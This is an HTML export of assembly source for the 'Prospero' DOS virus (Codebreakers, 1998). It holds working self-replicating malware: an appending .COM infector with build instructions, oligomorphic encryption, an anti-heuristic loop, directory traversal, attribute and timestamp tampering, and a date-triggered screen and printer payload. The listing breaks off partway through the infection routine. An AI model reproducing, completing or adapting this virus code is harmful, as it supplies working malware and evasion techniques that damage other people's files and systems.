<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;                          Prospero  Virus          </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                   (C) Opic [Codebreakers 1998]</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><span class="sc0">

</span><span class="sc1">;IMPORTANT NOTES:</span><span class="sc0">

</span><span class="sc1">;compiled with TASM 4.1 and TLINK 7.1 </span><span class="sc0">

</span><span class="sc1">;to compile: TASM prospero.asm </span><span class="sc0">
</span><span class="sc1">;            TLINK /t prospero.obj</span><span class="sc0">
</span><span class="sc1">;Rename Prospero.com Prospero.exe  (this is to avoid prospero infecting </span><span class="sc0">
</span><span class="sc1">;itself first generation only                        </span><span class="sc0">

</span><span class="sc1">;Type: appending .com infector</span><span class="sc0">

</span><span class="sc1">;virus size: 1st Gen 1723 bytes </span><span class="sc0">
</span><span class="sc1">;infected files grow 1712 bytes</span><span class="sc0">

</span><span class="sc1">;searches *.c* then comfirms *.COM</span><span class="sc0">

</span><span class="sc1">;does NOT infect command.com</span><span class="sc0">

</span><span class="sc1">;nor files bigger the 63824 bytes </span><span class="sc0">

</span><span class="sc1">;Encryption: 5 types (XOR, NEG, ROR, ROL,and NOT)---|</span><span class="sc0">
</span><span class="sc1">; used in combination for 7 algorithms    &lt;---------|</span><span class="sc0">

</span><span class="sc1">;Polymorphic: Yes (well Oligomorphic if you wanna get picky), there is a </span><span class="sc0">
</span><span class="sc1">;stock of 7 different 3op encryption algorithms and delta offsets rutines</span><span class="sc0">
</span><span class="sc1">;from which the virus chooses (a different type of encryption and delta </span><span class="sc0">
</span><span class="sc1">;offset is choosen every day of the week). the rest are safely </span><span class="sc0">
</span><span class="sc1">;encrypted inside the virus body.</span><span class="sc0">

</span><span class="sc1">;antiheuristics: yes.</span><span class="sc0">

</span><span class="sc1">;Directory Transversal: DotDot method </span><span class="sc0">

</span><span class="sc1">;restores infected file time/date stamps</span><span class="sc0">

</span><span class="sc1">;restores infected file DTA</span><span class="sc0">

</span><span class="sc1">;Rate of infection:no more then 7 per run</span><span class="sc0">

</span><span class="sc1">;restores infected file attributes</span><span class="sc0">

</span><span class="sc1">;payload criteria:The virus will manifest a payload on</span><span class="sc0">
</span><span class="sc1">;the 1st day of the month if the minutes are above 30.</span><span class="sc0">

</span><span class="sc1">;payload:a large graphical color text effect as well as a message</span><span class="sc0">
</span><span class="sc1">;is delivered from through printer:</span><span class="sc0">

</span><span class="sc1">;************************PROSPERO!**************************</span><span class="sc0">
</span><span class="sc1">;There is a path to the trancendece of the dollar: Embark                                                   </span><span class="sc0">
</span><span class="sc1">;rich beggars! Does magic bring prosperos to his knees?</span><span class="sc0">
</span><span class="sc1">;Reading pretty twilight, making grass uncertain?</span><span class="sc0">
</span><span class="sc1">;Oh,all that christmas snow shouldered by one birthday suit!</span><span class="sc0">
</span><span class="sc1">;The fate of the world under his armpit like a thermometer?</span><span class="sc0">
</span><span class="sc1">;Rejoice Villains! Your time has come.                                                    </span><span class="sc0">
</span><span class="sc1">;**************(C) Opic [CodeBreakers,98]*******************</span><span class="sc0">

</span><span class="sc1">;EXTRA SPECIAL GREETS AND THANX GO OUT TO:</span><span class="sc0">
</span><span class="sc1">;DARX_KIES, OWL[FS], DARKMAN, MIKEE, ALL the CodeBreakers and the countless</span><span class="sc0">
</span><span class="sc1">;others that have helped me learn and progress.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;OTHER: it has been awhile since I have looked at this virus, but it has come</span><span class="sc0">
</span><span class="sc1">;to my attention that it may have a bug in the directory transversal rutine,</span><span class="sc0">
</span><span class="sc1">;im not particularly interested in working on this virus any further, but </span><span class="sc0">
</span><span class="sc1">;felt it should be noted for the record (suprisingly it made it to the</span><span class="sc0">
</span><span class="sc1">;supplimentals on "the wild list").</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc2">.286</span><span class="sc0">
</span><span class="sc5">prospero</span><span class="sc0"> </span><span class="sc9">Segment</span><span class="sc0">
       </span><span class="sc9">Assume</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">prospero</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">prospero</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">prospero</span><span class="sc0">
       </span><span class="sc9">Org</span><span class="sc0"> </span><span class="sc2">100H</span><span class="sc0">
       </span><span class="sc5">jumps</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">                            
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">                  </span><span class="sc1">;loop to kill heuristic scanners</span><span class="sc0">

</span><span class="sc5">no_av1</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">no_av2</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c00h</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">no_av2</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">no_av1</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">                     </span><span class="sc1">;call delta</span><span class="sc0">

</span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">;duh!</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">                         </span><span class="sc1">;pop bp</span><span class="sc0">
  </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">            </span><span class="sc1">;fer the distanc</span><span class="sc0">
  </span><span class="sc6">Nop</span><span class="sc0">                            </span><span class="sc1">;You need those two nops.</span><span class="sc0">
  </span><span class="sc6">Nop</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span><span class="sc0">
</span><span class="sc1">;----------setup-----------------</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">c_start</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">;  </span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">c_start</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">encrypt</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">c_start</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">value</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">;decrypt value</span><span class="sc0">

</span><span class="sc5">stop</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">;label for later</span><span class="sc0">

</span><span class="sc1">;---------to be polyed------------</span><span class="sc0">

</span><span class="sc5">encrypt</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">;padding</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0"> </span><span class="sc9">Dup</span><span class="sc4">(</span><span class="sc2">90H</span><span class="sc4">)</span><span class="sc0">
  </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc1">;=21  for crypt</span><span class="sc0">
</span><span class="sc1">;--------start of crypt body-------</span><span class="sc0">
</span><span class="sc5">c_start</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">;part to crypt</span><span class="sc0">

</span><span class="sc1">;------clear infection counter----</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">counter</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                       </span><span class="sc1">;get first 3</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                    </span><span class="sc1">;restore em!</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">buff</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc1">;--------save DTA------------------</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">NewDTA</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                     </span><span class="sc1">;DTA to save</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2Ah</span><span class="sc0">                     </span><span class="sc1">;length of DTA 2ah</span><span class="sc0">
  </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                      </span><span class="sc1">;save it</span><span class="sc0">

</span><span class="sc1">;-----------first------------------</span><span class="sc0">
</span><span class="sc5">find_first</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;find first                                   </span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">                    </span><span class="sc1">;file</span><span class="sc0">

</span><span class="sc5">find_next</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">;we need this lata</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filemask</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;what we is lookin fer</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">                       </span><span class="sc1">;now!</span><span class="sc0">
  </span><span class="sc6">jnc</span><span class="sc0">  </span><span class="sc5">verify</span><span class="sc0">                    </span><span class="sc1">;find one? infect</span><span class="sc0">

</span><span class="sc1">;----------------DT--------------------------</span><span class="sc0">
</span><span class="sc5">dotdot</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">dot</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;get dot from dataseg</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Bh</span><span class="sc0">                     </span><span class="sc1">;cd</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">;go!</span><span class="sc0">
  </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">find_first</span><span class="sc0">                 </span><span class="sc1">;find first in new dir</span><span class="sc0">


</span><span class="sc1">;------------payload check--------------------</span><span class="sc0">
</span><span class="sc5">check_payload</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;payload check</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc0">                     </span><span class="sc1">;system date</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">;now!</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                       </span><span class="sc1">;is it the first?</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">n_check</span><span class="sc0">                   </span><span class="sc1">;yes? second check</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">
</span><span class="sc5">n_check</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Ch</span><span class="sc0">                     </span><span class="sc1">;internal clock</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">30d</span><span class="sc0">                     </span><span class="sc1">;minutes 30 or above?</span><span class="sc0">
  </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">payload</span><span class="sc0">                     </span><span class="sc1">;yes? lets do it!</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">                      </span><span class="sc1">;no? lets chill</span><span class="sc0">

</span><span class="sc1">;---------graphic payload-------------------------</span><span class="sc0">
</span><span class="sc5">payload</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">   </span><span class="sc1">;set mode 13h</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">     </span><span class="sc1">;call bios</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">030ah</span><span class="sc1">;dh/dl are the line/column coordinates</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">   </span><span class="sc1">;on page 0 </span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">  </span><span class="sc1">;02h=move cursor to</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">     </span><span class="sc1">;go</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">message1</span><span class="sc4">]</span><span class="sc1">;1st message </span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">14</span><span class="sc0">     </span><span class="sc1">;length</span><span class="sc0">

</span><span class="sc5">show</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">;shows the message</span><span class="sc0">
  </span><span class="sc6">lodsb</span><span class="sc0">         </span><span class="sc1">;keep goin</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">;color </span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">    </span><span class="sc1">;write one letter</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">show</span><span class="sc0">     </span><span class="sc1">;till we do em all</span><span class="sc0">
  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">507</span><span class="sc0">    </span><span class="sc1">;get ready fer #2</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">    </span><span class="sc1">;put cursor</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">message2</span><span class="sc4">]</span><span class="sc1">;mess2</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">27</span><span class="sc0">      </span><span class="sc1">;length</span><span class="sc0">

</span><span class="sc5">show2</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">; </span><span class="sc0">
  </span><span class="sc6">lodsb</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">30</span><span class="sc0">      </span><span class="sc1">;color</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">show2</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
  
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">   </span><span class="sc1">;begin of printer sect of payload</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">17h</span><span class="sc0">     </span><span class="sc1">;int for initializing printer</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">string1</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">EndStr1</span><span class="sc4">-</span><span class="sc5">String1</span><span class="sc0">

</span><span class="sc5">PrintStr</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
  </span><span class="sc6">lodsb</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">17h</span><span class="sc0">
  </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">PrintStr</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c00h</span><span class="sc1">;exit</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">;dos</span><span class="sc0">
   
              
</span><span class="sc1">;---------ret to host-------------</span><span class="sc0">
</span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">;exit stage left</span><span class="sc0">

</span><span class="sc1">;---------restore DTA------------------------</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">NewDTA</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;saved DTA     </span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                     </span><span class="sc1">;area it was</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2Ah</span><span class="sc0">                     </span><span class="sc1">;length</span><span class="sc0">
  </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                      </span><span class="sc1">;write it</span><span class="sc0">

  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">                      </span><span class="sc1">;start o file</span><span class="sc0">
  </span><span class="sc6">ret</span><span class="sc0">                            </span><span class="sc1">;dar!</span><span class="sc0">
               
</span><span class="sc1">;-------start .com checks--------</span><span class="sc0">
</span><span class="sc5">verify</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">13d</span><span class="sc0">                     </span><span class="sc1">;max size of file name</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">9eh</span><span class="sc0">                     </span><span class="sc1">; !!!!</span><span class="sc0">

</span><span class="sc1">;---------*.com and not command--------</span><span class="sc0">
</span><span class="sc5">compare</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">lodsb</span><span class="sc0">                          </span><span class="sc1">;find the point!</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"."</span><span class="sc0">                     </span><span class="sc1">;is it?</span><span class="sc0">
  </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">compare</span><span class="sc0">                    </span><span class="sc1">;no? try again</span><span class="sc0">
  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                         </span><span class="sc1">;yes? next letter</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"MO"</span><span class="sc0">        </span><span class="sc1">;does it spell .COM?</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">check_for_command_com</span><span class="sc0">       </span><span class="sc1">;no find next!</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">
</span><span class="sc5">check_for_command_com</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">9eh</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"MM"</span><span class="sc0">  </span><span class="sc1">;is it command.com?</span><span class="sc0">
  </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">close_file</span><span class="sc0">                 </span><span class="sc1">;yes? next!</span><span class="sc0">

</span><span class="sc1">;-------------save attribs-----------------</span><span class="sc0">
</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;duh!</span><span class="sc0">
  </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">95h</span><span class="sc0">                     </span><span class="sc1">; !!!! get dta</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">                     </span><span class="sc1">;mov it to cx</span><span class="sc0">
  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">attribs</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;save em</span><span class="sc0">
  </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                      </span><span class="sc1">;move em</span><span class="sc0">

</span><span class="sc1">;-------------clear atrribs----------------</span><span class="sc0">
  </span><span class="sc6">Mov</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">9Eh</span><span class="sc0">                    </span><span class="sc1">;filename in DTA</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                  </span><span class="sc1">;so we can infect</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                     </span><span class="sc1">;all .coms</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">

  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                   </span><span class="sc1">;open file fer read/write</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">9eh</span><span class="sc0">                     </span><span class="sc1">;get info</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">;go!</span><span class="sc0">
  </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">;put ax in bx</span><span class="sc0">

</span><span class="sc1">;---------------time/date-----------------------</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                   </span><span class="sc1">;get time/date stamp</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">;save em----|</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                        </span><span class="sc1">;   &lt;-------|</span><span class="sc0">
  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                        </span><span class="sc1">;   &lt;-------|</span><span class="sc0">

</span><span class="sc1">;--------------rand xor value--------------------</span><span class="sc0">
  </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">;new crypt value</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">value</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">;put it place</span><span class="sc0">

</span><span class="sc1">;--------------first 3-----------------------------</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                     </span><span class="sc1">;read 3 bytes from the file.. too</span><span class="sc0">
                                 </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                       </span><span class="sc1">;be replaced with a jump to the virus</span><span class="sc0">
